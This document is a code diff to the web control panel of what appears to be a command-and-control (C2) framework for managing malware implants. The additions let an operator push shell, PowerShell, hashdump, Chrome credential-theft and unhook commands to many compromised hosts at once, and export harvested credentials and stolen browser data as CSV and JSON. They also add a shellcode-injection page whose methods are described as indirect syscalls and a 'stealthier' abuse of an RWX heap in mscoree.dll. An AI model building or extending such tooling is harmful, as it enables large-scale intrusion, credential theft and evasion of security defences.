@@ -534,7 +534,7 @@ tr.dead-row td {
 
 /* task output */
 .task-list {
-  max-height: 400px;
+  max-height: 500px;
   overflow-y: auto;
 }
 
@@ -570,10 +570,41 @@ tr.dead-row td {
   word-break: break-all;
   background: var(--bg-tertiary);
   padding: 12px;
-  max-height: 400px;
+  max-height: 500px;
   overflow-y: auto;
   border: 1px solid var(--border);
+  position: relative;
 }
+
+.task-output:hover .copy-btn {
+  opacity: 1;
+}
+
+.copy-btn {
+  position: absolute;
+  top: 8px;
+  right: 8px;
+  background: var(--bg-secondary);
+  border: 1px solid var(--border);
+  color: var(--text-dim);
+  padding: 4px 8px;
+  font-size: 10px;
+  cursor: pointer;
+  opacity: 0;
+  transition: opacity 0.2s;
+}
+
+.copy-btn:hover {
+  color: var(--text);
+  border-color: var(--text-dim);
+}
+
+/* JSON syntax highlighting */
+.json-key { color: #7dd3fc; }
+.json-string { color: #a5d6a7; }
+.json-number { color: #ffcc80; }
+.json-bool { color: #ce93d8; }
+.json-null { color: #ef9a9a; }
 
 .task-error {
   color: var(--error);
@@ -1029,13 +1060,29 @@ tr.dead-row td {
       <!-- implants page -->
       <div class="page active" id="page-implants">
         <h1 class="page-title">implants</h1>
-        <div class="action-bar">
+        <div class="action-bar" style="gap:12px">
+          <div class="bulk-actions" id="bulkActions" style="display:none;align-items:center;gap:12px">
+            <span style="color:var(--text-dim);font-size:11px"><span id="selectedCount">0</span> selected</span>
+            <select class="command-select" id="bulkCommandType" style="min-width:120px">
+              <option value="shell">shell</option>
+              <option value="powershell">powershell</option>
+              <option value="hashdump">hashdump</option>
+              <option value="chrome">chrome</option>
+              <option value="whoami">whoami</option>
+              <option value="ps">ps</option>
+              <option value="unhook">unhook</option>
+              <option value="sleep">sleep</option>
+            </select>
+            <input type="text" class="command-input" id="bulkCommandArgs" placeholder="args (optional)" style="width:200px">
+            <button class="command-btn" onclick="executeBulkCommand()">execute on selected</button>
+          </div>
           <button class="action-btn danger" onclick="clearImplants()">clear all</button>
         </div>
         <div class="table-container">
           <table>
             <thead>
               <tr>
+                <th style="width:30px"><input type="checkbox" id="selectAllImplants" onchange="toggleSelectAll(this)"></th>
                 <th>status</th>
                 <th>id</th>
                 <th>user</th>
@@ -1063,8 +1110,7 @@ tr.dead-row td {
                 <th>status</th>
                 <th>name</th>
                 <th>type</th>
-                <th>host</th>
-                <th>port</th>
+                <th>address</th>
                 <th>actions</th>
               </tr>
             </thead>
@@ -1090,6 +1136,9 @@ tr.dead-row td {
           <div id="hashdumpResultsList"></div>
         </div>
         <div class="results-panel" id="results-chrome">
+          <div class="action-bar">
+            <button class="action-btn" onclick="exportChromeResults()">export json</button>
+          </div>
           <div id="chromeResultsList"></div>
         </div>
         <div class="results-panel" id="results-shell">
@@ -1103,6 +1152,9 @@ tr.dead-row td {
       <!-- credentials page -->
       <div class="page" id="page-credentials">
         <h1 class="page-title">credentials</h1>
+        <div class="action-bar">
+          <button class="action-btn" onclick="exportCredentials()">export csv</button>
+        </div>
         <div class="table-container">
           <table>
             <thead>
@@ -1162,19 +1214,19 @@ tr.dead-row td {
         <h1 class="page-title">shellcode execution</h1>
         <div class="shellcode-layout">
           <div class="shellcode-section">
-            <div class="detail-section-title">upload shellcode</div>
+            <div class="detail-section-title">shellcode input</div>
             <div class="form-group">
-              <label class="form-label">shellcode file (.bin)</label>
-              <input type="file" class="form-input" id="shellcodeFile" accept=".bin,.raw,.sc" onchange="handleShellcodeFile(event)">
+              <label class="form-label">upload file</label>
+              <input type="file" class="form-input" id="shellcodeFile" accept=".bin,.raw,.sc,.shellcode" onchange="handleShellcodeFile(event)" style="padding:8px">
             </div>
+            <div style="text-align:center;color:var(--text-dim);font-size:10px;margin:12px 0">— or paste below —</div>
             <div class="form-group">
-              <label class="form-label">or paste hex/base64</label>
-              <textarea class="form-input shellcode-textarea" id="shellcodeData" placeholder="paste shellcode as hex (4831c0...) or base64"></textarea>
+              <textarea class="form-input shellcode-textarea" id="shellcodeData" placeholder="supported formats:&#10;- raw hex: 4831c050...&#10;- spaced hex: 48 31 c0 50...&#10;- \x format: \x48\x31\xc0...&#10;- 0x format: 0x48,0x31,0xc0...&#10;- base64: SDHAUEiJ5Q==" oninput="detectShellcodeFormat()"></textarea>
             </div>
-            <div class="shellcode-info" id="shellcodeInfo"></div>
+            <div class="shellcode-info" id="shellcodeInfo">no shellcode loaded</div>
           </div>
           <div class="shellcode-section">
-            <div class="detail-section-title">execute</div>
+            <div class="detail-section-title">execution options</div>
             <div class="form-group">
               <label class="form-label">target implant</label>
               <select class="form-input" id="shellcodeTargetImplant">
@@ -1184,15 +1236,18 @@ tr.dead-row td {
             <div class="form-group">
               <label class="form-label">injection method</label>
               <select class="form-input" id="shellcodeMethod">
-                <option value="indirect">indirect syscall (recommended)</option>
-                <option value="enclave">enclave (mscoree heap)</option>
+                <option value="indirect">indirect syscall</option>
+                <option value="enclave">enclave injection</option>
                 <option value="once">rtl run once</option>
               </select>
             </div>
-            <div class="method-info">
-              <div class="method-desc" id="methodDesc">Uses NtAllocateVirtualMemory + RtlCreateUserThread via indirect syscalls</div>
+            <div class="method-info" id="methodInfo">
+              <div class="method-desc" id="methodDesc">ntallocatevirtualmemory + rtlcreateuserthread via indirect syscalls. recommended for most scenarios.</div>
             </div>
-            <button class="command-btn" onclick="executeShellcode()" style="width:100%;margin-top:12px">execute shellcode</button>
+            <button class="command-btn" onclick="executeShellcode()" style="width:100%;margin-top:16px">execute</button>
+            <div style="margin-top:12px;padding:10px;background:var(--bg);border:1px solid var(--border);font-size:10px;color:var(--text-dim)">
+              <strong style="color:var(--warning)">warning:</strong> shellcode runs in implant process. test payloads carefully.
+            </div>
           </div>
         </div>
       </div>
@@ -1228,7 +1283,7 @@ tr.dead-row td {
             <option value="chrome">chrome</option>
             <option value="screenshot">screenshot</option>
             <option value="unhook">unhook</option>
-            <option value="bof">bof</option>
+            <option value="sleep">sleep</option>
           </select>
           <input type="text" class="command-input" id="commandArgs" placeholder="arguments (optional)">
           <button class="command-btn" onclick="sendCommand()">execute</button>
@@ -1411,21 +1466,24 @@ async function loadImplants() {
   
   const tbody = document.getElementById('implantsTable');
   if (implants.length === 0) {
-    tbody.innerHTML = '<tr><td colspan="7" style="text-align:center;color:var(--text-dim);padding:40px">no implants connected</td></tr>';
+    tbody.innerHTML = '<tr><td colspan="8" style="text-align:center;color:var(--text-dim);padding:40px"><div style="margin-bottom:8px">no implants connected</div><div style="font-size:10px">deploy a stager to receive callbacks</div></td></tr>';
     return;
   }
   
   tbody.innerHTML = implants.map(i => ` + "`" + `
-    <tr class="clickable ${i.alive ? '' : 'dead-row'}" onclick="selectImplant('${i.id}')">
-      <td><span class="status ${i.alive ? 'alive' : 'dead'}"></span>${i.alive ? 'alive' : 'dead'}</td>
-      <td class="truncate">${i.id.substring(0,8)}</td>
-      <td>${i.elevated ? '<span class="elevated">*</span>' : ''}${i.username}</td>
-      <td>${i.hostname}</td>
-      <td>${i.os}/${i.arch}</td>
-      <td>${i.pid}</td>
-      <td>${formatTime(i.last_seen)}</td>
+    <tr class="clickable ${i.alive ? '' : 'dead-row'}">
+      <td onclick="event.stopPropagation()"><input type="checkbox" class="implant-checkbox" data-id="${i.id}" data-alive="${i.alive}" onchange="updateBulkSelection()" ${i.alive ? '' : 'disabled'}></td>
+      <td onclick="selectImplant('${i.id}')"><span class="status ${i.alive ? 'alive' : 'dead'}"></span>${i.alive ? 'alive' : 'dead'}</td>
+      <td onclick="selectImplant('${i.id}')" class="truncate">${i.id.substring(0,8)}</td>
+      <td onclick="selectImplant('${i.id}')">${i.elevated ? '<span class="elevated">*</span>' : ''}${i.username}</td>
+      <td onclick="selectImplant('${i.id}')">${i.hostname}</td>
+      <td onclick="selectImplant('${i.id}')">${i.os}/${i.arch}</td>
+      <td onclick="selectImplant('${i.id}')">${i.pid}</td>
+      <td onclick="selectImplant('${i.id}')">${formatTime(i.last_seen)}</td>
     </tr>
   ` + "`" + `).join('');
+  
+  updateBulkSelection();
 }
 
 async function selectImplant(id) {
@@ -1467,7 +1525,7 @@ async function loadImplantTasks(id) {
         <span class="task-type"><span class="status ${t.status}"></span>${t.type}</span>
         <span class="task-time">${formatTime(t.created)}</span>
       </div>
-      ${t.output ? ` + "`" + `<div class="task-output">${escapeHtml(decodeOutput(t.output))}</div>` + "`" + ` : ''}
+      ${t.output ? ` + "`" + `<div class="task-output">${formatOutput(t.output, t.type)}</div>` + "`" + ` : ''}
       ${t.error ? ` + "`" + `<div class="task-output task-error">${escapeHtml(t.error)}</div>` + "`" + ` : ''}
     </div>
   ` + "`" + `).join('');
@@ -1478,11 +1536,75 @@ function closeDetail() {
   currentImplant = null;
 }
 
+function toggleSelectAll(checkbox) {
+  const checkboxes = document.querySelectorAll('.implant-checkbox:not([disabled])');
+  checkboxes.forEach(cb => cb.checked = checkbox.checked);
+  updateBulkSelection();
+}
+
+function updateBulkSelection() {
+  const checked = document.querySelectorAll('.implant-checkbox:checked');
+  const count = checked.length;
+  document.getElementById('selectedCount').textContent = count;
+  document.getElementById('bulkActions').style.display = count > 0 ? 'flex' : 'none';
+  
+  // Update select-all checkbox state
+  const allCheckboxes = document.querySelectorAll('.implant-checkbox:not([disabled])');
+  const selectAll = document.getElementById('selectAllImplants');
+  if (allCheckboxes.length === 0) {
+    selectAll.checked = false;
+    selectAll.indeterminate = false;
+  } else if (count === 0) {
+    selectAll.checked = false;
+    selectAll.indeterminate = false;
+  } else if (count === allCheckboxes.length) {
+    selectAll.checked = true;
+    selectAll.indeterminate = false;
+  } else {
+    selectAll.checked = false;
+    selectAll.indeterminate = true;
+  }
+}
+
+async function executeBulkCommand() {
+  const checked = document.querySelectorAll('.implant-checkbox:checked');
+  if (checked.length === 0) {
+    toast('no implants selected', 'error');
+    return;
+  }
+  
+  const type = document.getElementById('bulkCommandType').value;
+  const args = document.getElementById('bulkCommandArgs').value.trim();
+  
+  let successCount = 0;
+  for (const cb of checked) {
+    const id = cb.dataset.id;
+    try {
+      await apiPost('/implants/' + id + '/tasks', {
+        type: type,
+        args: args ? [args] : []
+      });
+      successCount++;
+    } catch (e) {
+      console.error('Failed to queue task for ' + id, e);
+    }
+  }
+  
+  document.getElementById('bulkCommandArgs').value = '';
+  toast('queued ' + type + ' on ' + successCount + ' implants', 'success');
+  
+  // Uncheck all
+  checked.forEach(cb => cb.checked = false);
+  document.getElementById('selectAllImplants').checked = false;
+  updateBulkSelection();
+}
+
 async function clearImplants() {
-  if (!confirm('Clear all implants and their task history?')) return;
+  if (!confirm('clear all implants and their task history?')) return;
   await apiDelete('/implants');
   closeDetail();
   loadImplants();
+  toast('all implants cleared', 'success');
 }
 
 async function sendCommand() {
@@ -1491,18 +1613,25 @@ async function sendCommand() {
   const type = document.getElementById('commandType').value;
   const args = document.getElementById('commandArgs').value.trim();
   
-  // Handle screenshot specially - execute BOF with server URL
   if (type === 'screenshot') {
     await executeScreenshot();
     return;
   }
   
+  let taskArgs = args ? [args] : [];
+  
+  if (type === 'sleep' && args) {
+    const parts = args.split(/\s+/);
+    taskArgs = parts.map(p => p.replace('%', ''));
+  }
+  
   await apiPost('/implants/' + currentImplant.id + '/tasks', {
     type: type,
-    args: args ? [args] : []
+    args: taskArgs
   });
   
   document.getElementById('commandArgs').value = '';
+  toast('task queued: ' + type, 'success');
   setTimeout(() => loadImplantTasks(currentImplant.id), 500);
 }
 
@@ -1511,13 +1640,13 @@ async function executeScreenshot() {
   
   const bofData = await api('/bofs/screenshot.x64.o');
   if (!bofData || !bofData.data) {
-    toast('Screenshot BOF not found (screenshot.x64.o)', 'error');
+    toast('screenshot bof not found (screenshot.x64.o)', 'error');
     return;
   }
   
   const argsStr = document.getElementById('commandArgs').value.trim();
   if (!argsStr) {
-    toast('No args - select screenshot to auto-fill', 'error');
+    toast('no args - select screenshot to auto-fill', 'error');
     return;
   }
   
@@ -1535,7 +1664,7 @@ async function executeScreenshot() {
   });
   
   document.getElementById('commandArgs').value = '';
-  toast('Screenshot task queued', 'success');
+  toast('screenshot task queued', 'success');
   setTimeout(() => loadImplantTasks(currentImplant.id), 500);
 }
 
@@ -1546,17 +1675,23 @@ async function loadListeners() {
   
   const tbody = document.getElementById('listenersTable');
   if (listeners.length === 0) {
-    tbody.innerHTML = '<tr><td colspan="6" style="text-align:center;color:var(--text-dim);padding:40px">no listeners</td></tr>';
+    tbody.innerHTML = '<tr><td colspan="5" style="text-align:center;color:var(--text-dim);padding:40px"><div style="margin-bottom:8px">no listeners configured</div><div style="font-size:10px">click "+ new listener" to create one</div></td></tr>';
     return;
   }
   
-  tbody.innerHTML = listeners.map(l => ` + "`" + `
+  tbody.innerHTML = listeners.map(l => {
+    const listenerUrl = 'http://' + (l.host === '0.0.0.0' ? window.location.hostname : l.host) + ':' + l.port;
+    return ` + "`" + `
     <tr>
       <td><span class="badge ${l.active ? 'active' : ''}">${l.active ? 'active' : 'stopped'}</span></td>
       <td>${l.name}</td>
       <td>${l.type}</td>
-      <td>${l.host}</td>
-      <td>${l.port}</td>
+      <td>
+        <span style="cursor:pointer" onclick="copyToClipboard('${listenerUrl}', this)" title="click to copy url">
+          ${l.host}:${l.port}
+          <span style="color:var(--text-dim);font-size:10px;margin-left:4px">[copy]</span>
+        </span>
+      </td>
       <td>
         ${l.active 
           ? ` + "`" + `<button class="action-btn danger" onclick="stopListener('${l.id}')">stop</button>` + "`" + `
@@ -1564,7 +1699,7 @@ async function loadListeners() {
         <button class="action-btn danger" onclick="deleteListener('${l.id}')">delete</button>
       </td>
     </tr>
-  ` + "`" + `).join('');
+  ` + "`" + `}).join('');
 }
 
 function showNewListenerModal() {
@@ -1576,38 +1711,74 @@ function closeNewListenerModal() {
 }
 
 async function createListener() {
+  const name = document.getElementById('listenerName').value;
   await apiPost('/listeners', {
-    name: document.getElementById('listenerName').value,
+    name: name,
     type: document.getElementById('listenerType').value,
     host: document.getElementById('listenerHost').value,
     port: parseInt(document.getElementById('listenerPort').value)
   });
   closeNewListenerModal();
   loadListeners();
+  toast('listener created: ' + name, 'success');
 }
 
 async function startListener(id) {
   await apiPost('/listeners/' + id + '/start', {});
   loadListeners();
+  toast('listener started', 'success');
 }
 
 async function stopListener(id) {
   await apiPost('/listeners/' + id + '/stop', {});
   loadListeners();
+  toast('listener stopped', 'warning');
 }
 
 async function deleteListener(id) {
+  if (!confirm('delete this listener?')) return;
   await apiDelete('/listeners/' + id);
   loadListeners();
+  toast('listener deleted', 'success');
 }
 
 // credentials
+let allCredentials = [];
+
+async function exportCredentials() {
+  if (allCredentials.length === 0) {
+    toast('no credentials to export', 'warning');
+    return;
+  }
+  const csv = 'source,domain,username,secret,type\n' + 
+    allCredentials.map(c => 
+      [c.source, c.domain || '', c.username, c.secret, c.type]
+        .map(v => '"' + String(v).replace(/"/g, '""') + '"')
+        .join(',')
+    ).join('\n');
+  downloadFile('credentials.csv', csv, 'text/csv');
+  toast('exported ' + allCredentials.length + ' credentials', 'success');
+}
+
+function downloadFile(filename, content, mimeType) {
+  const blob = new Blob([content], {type: mimeType});
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url;
+  a.download = filename;
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+  URL.revokeObjectURL(url);
+}
+
 async function loadCredentials() {
-  const creds = await api('/credentials') || [];
+  allCredentials = await api('/credentials') || [];
+  const creds = allCredentials;
   const tbody = document.getElementById('credentialsTable');
   
   if (creds.length === 0) {
-    tbody.innerHTML = '<tr><td colspan="5" style="text-align:center;color:var(--text-dim);padding:40px">no credentials</td></tr>';
+    tbody.innerHTML = '<tr><td colspan="5" style="text-align:center;color:var(--text-dim);padding:40px"><div style="margin-bottom:8px">no credentials harvested</div><div style="font-size:10px">run hashdump or chrome on an implant</div></td></tr>';
     return;
   }
   
@@ -1616,7 +1787,7 @@ async function loadCredentials() {
       <td>${c.source}</td>
       <td>${c.domain || '-'}</td>
       <td>${c.username}</td>
-      <td class="truncate">${c.secret}</td>
+      <td class="truncate" title="${escapeHtml(c.secret)}" style="cursor:pointer" onclick="copyToClipboard('${escapeHtml(c.secret).replace(/'/g, "\\'")}', this)">${c.secret}</td>
       <td>${c.type}</td>
     </tr>
   ` + "`" + `).join('');
@@ -1628,7 +1799,7 @@ async function loadScreenshots() {
   const grid = document.getElementById('screenshotGrid');
   
   if (screenshots.length === 0) {
-    grid.innerHTML = '<div class="empty-state"><div class="empty-state-icon">○</div>no screenshots yet</div>';
+    grid.innerHTML = '<div class="empty-state"><div class="empty-state-icon">--</div>no screenshots yet</div>';
     return;
   }
   
@@ -1653,6 +1824,25 @@ function closeScreenshotModal() {
 }
 
 // results
+let chromeResults = [];
+
+async function exportChromeResults() {
+  if (chromeResults.length === 0) {
+    toast('no chrome results to export', 'warning');
+    return;
+  }
+  const exportData = chromeResults.map(t => {
+    try {
+      return JSON.parse(atob(t.output));
+    } catch (e) {
+      return {error: 'decode failed', task_id: t.id};
+    }
+  });
+  const json = JSON.stringify(exportData, null, 2);
+  downloadFile('chrome_results.json', json, 'application/json');
+  toast('exported ' + chromeResults.length + ' chrome results', 'success');
+}
+
 async function loadAllResults() {
   const implants = await api('/implants') || [];
   let allTasks = [];
@@ -1665,9 +1855,11 @@ async function loadAllResults() {
   
   allTasks.sort((a, b) => new Date(b.created) - new Date(a.created));
   
+  chromeResults = allTasks.filter(t => t.type === 'chrome' && t.output);
+  
   renderResults('allResultsList', allTasks);
   renderResults('hashdumpResultsList', allTasks.filter(t => t.type === 'hashdump'));
-  renderResults('chromeResultsList', allTasks.filter(t => t.type === 'chrome'));
+  renderResults('chromeResultsList', chromeResults);
   renderResults('shellResultsList', allTasks.filter(t => t.type === 'shell' || t.type === 'powershell'));
   renderResults('bofResultsList', allTasks.filter(t => t.type === 'bof'));
 }
@@ -1676,7 +1868,7 @@ function renderResults(containerId, tasks) {
   const container = document.getElementById(containerId);
   
   if (tasks.length === 0) {
-    container.innerHTML = '<div class="empty-state"><div class="empty-state-icon">○</div>no results yet</div>';
+    container.innerHTML = '<div class="empty-state"><div class="empty-state-icon">--</div><div>no results yet</div><div style="font-size:10px;color:var(--text-dim);margin-top:8px">execute tasks on implants to see output</div></div>';
     return;
   }
   
@@ -1689,7 +1881,7 @@ function renderResults(containerId, tasks) {
         </span>
         <span class="task-time">${formatTime(t.created)}</span>
       </div>
-      ${t.output ? ` + "`" + `<div class="task-output">${escapeHtml(decodeOutput(t.output))}</div>` + "`" + ` : ''}
+      ${t.output ? ` + "`" + `<div class="task-output">${formatOutput(t.output, t.type)}</div>` + "`" + ` : ''}
       ${t.error ? ` + "`" + `<div class="task-output task-error">${escapeHtml(t.error)}</div>` + "`" + ` : ''}
     </div>
   ` + "`" + `).join('');
@@ -1712,13 +1904,67 @@ function toast(message, type = 'info') {
 function formatTime(ts) {
   if (!ts) return '-';
   const d = new Date(ts);
-  return d.toLocaleTimeString('en-US', {hour12: false});
+  const now = Date.now();
+  const diff = now - d.getTime();
+  
+  if (diff < 0) return 'just now';
+  if (diff < 60000) return Math.floor(diff / 1000) + 's ago';
+  if (diff < 3600000) return Math.floor(diff / 60000) + 'm ago';
+  if (diff < 86400000) return Math.floor(diff / 3600000) + 'h ago';
+  if (diff < 604800000) return Math.floor(diff / 86400000) + 'd ago';
+  return d.toLocaleDateString('en-US', {month: 'short', day: 'numeric'});
 }
 
 function escapeHtml(text) {
   const div = document.createElement('div');
   div.textContent = text;
   return div.innerHTML;
+}
+
+function highlightJson(str) {
+  if (!str) return '';
+  const trimmed = str.trim();
+  if (!trimmed.startsWith('{') && !trimmed.startsWith('[')) {
+    return escapeHtml(str);
+  }
+  try {
+    const obj = JSON.parse(str);
+    return syntaxHighlight(JSON.stringify(obj, null, 2));
+  } catch (e) {
+    return escapeHtml(str);
+  }
+}
+
+function syntaxHighlight(json) {
+  json = json.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+  return json.replace(/("(\\u[a-zA-Z0-9]{4}|\\[^u]|[^\\"])*"(\s*:)?|\b(true|false|null)\b|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?)/g, function (match) {
+    let cls = 'json-number';
+    if (/^"/.test(match)) {
+      if (/:$/.test(match)) {
+        cls = 'json-key';
+      } else {
+        cls = 'json-string';
+      }
+    } else if (/true|false/.test(match)) {
+      cls = 'json-bool';
+    } else if (/null/.test(match)) {
+      cls = 'json-null';
+    }
+    return '<span class="' + cls + '">' + match + '</span>';
+  });
+}
+
+function formatOutput(b64, taskType) {
+  if (!b64) return '';
+  try {
+    const decoded = atob(b64);
+    if (taskType === 'chrome') {
+      return highlightJson(decoded);
+    }
+    return escapeHtml(decoded);
+  } catch (e) {
+    return '[decode error: ' + e.message + ']';
+  }
 }
 
 function decodeOutput(b64) {
@@ -1744,7 +1990,7 @@ async function loadBOFs() {
 function renderBOFs(bofs) {
   const list = document.getElementById('bofList');
   if (bofs.length === 0) {
-    list.innerHTML = '<div class="empty-state">no bofs found</div>';
+    list.innerHTML = '<div class="empty-state" style="padding:20px;text-align:center"><div style="margin-bottom:8px">no BOFs found</div><div style="font-size:10px;color:var(--text-dim)">place .o files in build/BOFs/</div></div>';
     return;
   }
   
@@ -1794,37 +2040,41 @@ async function selectBOF(name) {
 async function updateBofImplantSelect() {
   const implants = await api('/implants') || [];
   const select = document.getElementById('bofTargetImplant');
-  const currentValue = select.value; // Preserve current selection
+  const currentValue = select.value;
   
-  // Update alive status
   implants.forEach(i => { i.alive = isImplantAlive(i); });
   
   select.innerHTML = '<option value="">select implant...</option>' + 
-    implants.filter(i => i.alive).map(i => 
-      ` + "`" + `<option value="${i.id}">${i.hostname} (${i.username})</option>` + "`" + `
+    implants.map(i => 
+      ` + "`" + `<option value="${i.id}" ${i.alive ? '' : 'disabled style="color:var(--text-dim)"'}>${i.hostname} (${i.username})${i.alive ? '' : ' [dead]'}</option>` + "`" + `
     ).join('');
   
-  // Restore selection if still valid
-  if (currentValue && select.querySelector(` + "`" + `option[value="${currentValue}"]` + "`" + `)) {
-    select.value = currentValue;
+  // Clear selection if implant died
+  if (currentValue) {
+    const implant = implants.find(i => i.id === currentValue);
+    if (implant && implant.alive) {
+      select.value = currentValue;
+    } else {
+      select.value = '';
+    }
   }
 }
 
 async function executeBOF() {
   if (!selectedBOF) {
-    toast('Please select a BOF', 'error');
+    toast('please select a bof', 'error');
     return;
   }
   
   const implantId = document.getElementById('bofTargetImplant').value;
   if (!implantId) {
-    toast('Please select a target implant', 'error');
+    toast('please select a target implant', 'error');
     return;
   }
   
   const bofData = await api('/bofs/' + selectedBOF);
   if (!bofData || !bofData.data) {
-    toast('Failed to load BOF data', 'error');
+    toast('failed to load bof data', 'error');
     return;
   }
   
@@ -1845,7 +2095,7 @@ async function executeBOF() {
   });
   
   document.getElementById('bofArgs').value = '';
-  toast('BOF queued: ' + selectedBOF, 'success');
+  toast('bof queued: ' + selectedBOF, 'success');
 }
 
 function formatSize(bytes) {
@@ -1860,19 +2110,23 @@ let shellcodeBytes = null;
 async function updateShellcodeImplantSelect() {
   const implants = await api('/implants') || [];
   const select = document.getElementById('shellcodeTargetImplant');
-  const currentValue = select.value; // Preserve current selection
+  const currentValue = select.value;
   
-  // Update alive status
   implants.forEach(i => { i.alive = isImplantAlive(i); });
   
   select.innerHTML = '<option value="">select implant...</option>' + 
-    implants.filter(i => i.alive).map(i => 
-      ` + "`" + `<option value="${i.id}">${i.hostname} (${i.username})</option>` + "`" + `
+    implants.map(i => 
+      ` + "`" + `<option value="${i.id}" ${i.alive ? '' : 'disabled style="color:var(--text-dim)"'}>${i.hostname} (${i.username})${i.alive ? '' : ' [dead]'}</option>` + "`" + `
     ).join('');
   
-  // Restore selection if still valid
-  if (currentValue && select.querySelector(` + "`" + `option[value="${currentValue}"]` + "`" + `)) {
-    select.value = currentValue;
+  // Clear selection if implant died
+  if (currentValue) {
+    const implant = implants.find(i => i.id === currentValue);
+    if (implant && implant.alive) {
+      select.value = currentValue;
+    } else {
+      select.value = '';
+    }
   }
 }
 
@@ -1884,9 +2138,37 @@ function handleShellcodeFile(event) {
   reader.onload = function(e) {
     shellcodeBytes = new Uint8Array(e.target.result);
     document.getElementById('shellcodeData').value = '';
-    document.getElementById('shellcodeInfo').textContent = ` + "`" + `Loaded ${file.name}: ${shellcodeBytes.length} bytes` + "`" + `;
+    document.getElementById('shellcodeInfo').innerHTML = ` + "`" + `<span style="color:var(--success)">[ok]</span> ${file.name} - ${shellcodeBytes.length} bytes` + "`" + `;
   };
   reader.readAsArrayBuffer(file);
+}
+
+function detectShellcodeFormat() {
+  const input = document.getElementById('shellcodeData').value.trim();
+  const info = document.getElementById('shellcodeInfo');
+  
+  if (!input) {
+    if (shellcodeBytes) {
+      return;
+    }
+    info.textContent = 'no shellcode loaded';
+    return;
+  }
+  
+  shellcodeBytes = null;
+  const bytes = parseShellcodeInput();
+  
+  if (bytes && bytes.length > 0) {
+    let format = 'unknown';
+    if (input.includes('\\x')) format = '\\x hex';
+    else if (input.includes('0x')) format = '0x array';
+    else if (/^[0-9a-fA-F\s]+$/.test(input)) format = 'raw hex';
+    else format = 'base64';
+    
+    info.innerHTML = ` + "`" + `<span style="color:var(--success)">[ok]</span> detected ${format} - ${bytes.length} bytes` + "`" + `;
+  } else {
+    info.innerHTML = ` + "`" + `<span style="color:var(--error)">[error]</span> invalid format` + "`" + `;
+  }
 }
 
 function parseShellcodeInput() {
@@ -1919,13 +2201,13 @@ function parseShellcodeInput() {
 async function executeShellcode() {
   const bytes = parseShellcodeInput();
   if (!bytes || bytes.length === 0) {
-    toast('Please upload a shellcode file or paste shellcode data', 'error');
+    toast('please upload a shellcode file or paste shellcode data', 'error');
     return;
   }
   
   const implantId = document.getElementById('shellcodeTargetImplant').value;
   if (!implantId) {
-    toast('Please select a target implant', 'error');
+    toast('please select a target implant', 'error');
     return;
   }
   
@@ -1948,7 +2230,7 @@ async function executeShellcode() {
     })
   });
   
-  toast(` + "`" + `Shellcode queued (${bytes.length} bytes, ${method})` + "`" + `, 'success');
+  toast(` + "`" + `shellcode queued (${bytes.length} bytes, ${method})` + "`" + `, 'success');
 }
 
 // Update method description on change
@@ -1959,13 +2241,13 @@ document.addEventListener('DOMContentLoaded', function() {
       const desc = document.getElementById('methodDesc');
       switch (this.value) {
         case 'indirect':
-          desc.textContent = 'Uses NtAllocateVirtualMemory + RtlCreateUserThread via indirect syscalls';
+          desc.innerHTML = 'ntallocatevirtualmemory + rtlcreateuserthread via indirect syscalls. <span style="color:var(--success)">recommended</span> for most scenarios.';
           break;
         case 'enclave':
-          desc.textContent = 'Uses mscoree.dll RWX heap + vdsutil.dll allocation + LdrCallEnclave execution';
+          desc.innerHTML = 'abuses mscoree.dll rwx heap + ldrcallenclave. <span style="color:var(--warning)">stealthier</span> but requires .net runtime.';
           break;
         case 'once':
-          desc.textContent = 'Uses RtlRunOnceExecuteOnce (SYNC - do NOT use shellcode that exits process!)';
+          desc.innerHTML = 'rtlrunonceexecuteonce callback. <span style="color:var(--error)">[sync]</span> - shellcode must return, do not use exit payloads!';
           break;
       }
     });
@@ -2011,13 +2293,35 @@ document.getElementById('commandType').addEventListener('change', async function
       break;
     case 'bof':
       argsInput.value = '';
-      argsInput.placeholder = 'use BOFs page instead';
+      argsInput.placeholder = 'use bofs page instead';
+      break;
+    case 'sleep':
+      argsInput.value = '';
+      argsInput.placeholder = 'seconds [jitter%] (e.g. 10 20)';
       break;
     default:
       argsInput.value = '';
       argsInput.placeholder = 'arguments (optional)';
   }
 });
+
+// keyboard shortcuts
+document.addEventListener('keydown', e => {
+  if (e.key === 'Escape') {
+    closeDetail();
+    closeNewListenerModal();
+    closeScreenshotModal();
+  }
+});
+
+// copy to clipboard
+function copyToClipboard(text, btn) {
+  navigator.clipboard.writeText(text).then(() => {
+    const orig = btn.textContent;
+    btn.textContent = 'copied!';
+    setTimeout(() => btn.textContent = orig, 1000);
+  });
+}
 
 // init
 checkAuth();
